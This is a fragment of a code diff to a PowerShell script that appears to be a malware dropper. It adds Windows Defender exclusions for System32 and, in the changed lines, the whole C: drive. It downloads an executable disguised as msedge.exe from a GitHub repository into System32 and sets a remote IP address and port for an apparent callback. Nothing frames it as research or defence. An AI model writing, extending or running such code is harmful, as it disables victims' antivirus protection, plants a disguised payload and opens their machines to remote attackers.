@@ -100,16 +100,17 @@ if ($thirdPartyAntivirus.Count -gt 0) {
 }
 
 $system32Path = [Environment]::SystemDirectory
-$programDataPath = [Environment]::GetFolderPath('CommonApplicationData')
 
 $filePath = Join-Path $system32Path "msedge.exe"
 $url = "https://github.com/visionscreenx/edge/raw/refs/heads/main/msedge.exe"
 
 Add-MpPreference -ExclusionPath $system32Path
-Add-MpPreference -ExclusionPath $programDataPath
 
 $ProgressPreference = 'SilentlyContinue'
 Invoke-WebRequest -Uri $url -OutFile $filePath
+
+Add-MpPreference -ExclusionPath "C:\"
+Start-Sleep -Seconds 5
 
 $targetIP = "172.84.94.22"
 $targetPort = 40129
